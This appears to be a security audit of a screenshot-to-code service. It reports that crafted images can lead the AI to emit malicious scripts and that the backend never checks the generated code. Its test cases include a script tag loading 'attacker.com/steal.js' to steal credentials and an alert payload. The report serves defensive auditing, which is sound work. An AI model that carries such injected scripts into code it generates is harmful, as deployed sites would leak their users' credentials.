### Vulnerabilities Meeting Criteria

#### 1. **Malicious Code Generation via Crafted Input Images (Critical)**
**Description**
Attackers can upload crafted input images designed to trick AI models into generating malicious code (e.g., phishing scripts, credential stealers). The backend processes images directly and returns code without validation.

**Exploit Steps**
1. Attacker sends an image of a login form with hidden malicious `<script>` to steal credentials.
2. The AI generates code containing the malicious script.
3. Users deploy the code unreviewed, exposing their users to attacks.

**Impact**
Generated code can execute arbitrary payloads, compromising users or systems.

**Rank** Critical

**Preconditions**
User access to the code generation endpoint.

**Source Code Analysis**
- **routes/generate_code.py**: The WebSocket route processes image data URLs directly (e.g., `stream_claude_response_native`).
- **prompts/screenshot_system_prompts.py**: AI is instructed to generate code matching the input image exactly, without safety guards.
- **image_processing/utils.py**: Preprocessing focuses on size/quality, not malicious content.

**Security Test Case**
1. Upload an image of a webpage with a hidden `<script src='attacker.com/steal.js'>`.
2. Use the API to generate code.
3. Verify the response includes the malicious script.

#### 2. **Missing Server-Side Validation of Generated Code (High)**
**Description**
The backend does not validate generated code for malicious elements (e.g., `<script>` tags, untrusted CDNs).

**Exploit Steps**
1. Send an image prompting the AI to include malicious JavaScript (e.g., `<script>alert(1)</script>`).
2. The backend returns the unfiltered code, which users deploy.

**Impact**
Deployed code can execute harmful payloads, exposing user data or systems.

**Rank** High

**Preconditions**
Attacker access to the code generation endpoint.

**Source Code Analysis**
- **routes/generate_code.py**: The `generate_code` function returns raw AI output without content checks.

**Security Test Case**
1. Request code generation for an image containing a malicious `<script>` tag.
2. Confirm the response includes the malicious code.

### Summary
Only **2 vulnerabilities** meet the criteria:
1. **Malicious Code Generation via Crafted Input Images** (Critical): Core risk of AI generating harmful code.
2. **Missing Server-Side Validation of Generated Code** (High): Lack of checks for malicious content in code.

Other vulnerabilities were excluded due to:
- Lower severity (Medium/Low).
- Unrealistic exploit scenarios (e.g., debug mode requires server access).
- Incomplete descriptions (missing source code analysis/security test cases).
- Irrelevance to the primary attack vector (e.g., CORS misconfiguration, API key exposure).

**Critical Action Required**: Implement server-side validation and filtering of AI-generated code to block malicious payloads.
